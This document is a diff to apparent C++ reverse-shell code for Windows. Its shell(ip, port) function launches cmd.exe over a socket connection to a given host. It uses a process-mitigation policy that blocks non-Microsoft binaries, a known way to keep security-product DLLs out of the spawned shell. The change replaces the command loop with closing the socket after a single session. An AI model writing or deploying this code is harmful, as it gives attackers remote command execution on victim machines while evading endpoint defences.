@@ -60,29 +60,25 @@ void shell(wchar_t* ip, int port)
 	        size
         ));
 
+    	
         InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
         DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
         UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), nullptr, nullptr);
 
         PROCESS_INFORMATION pi;
+        DWORD exit_code = 0;
         // ReSharper disable once CppFunctionalStyleCast
-        CreateProcessA(nullptr, LPSTR(R"(C:\Windows\System32\cmd.exe)"), nullptr, nullptr, TRUE, 0, nullptr, nullptr, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
-        WaitForSingleObject(pi.hProcess, INFINITE);
+    	CreateProcessA(nullptr, LPSTR(R"(C:\Windows\System32\cmd.exe)"), nullptr, nullptr, TRUE, 0, nullptr, nullptr,reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
 
+    	WaitForSingleObject(pi.hProcess, INFINITE);
+
+        TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
 
-        memset(receive_data, 0, sizeof(receive_data));
-        receive_code = recv(my_socket, receive_data, default_buffer_length, 0);
-        if (receive_code <= 0) {
-            closesocket(my_socket);
-            WSACleanup();
-            continue;
-        }
-
-        if (strcmp(receive_data, "exit\n") == 0) {
-            break;
-        }
+        closesocket(my_socket);
+        WSACleanup();
+        break;
     }
 }
 
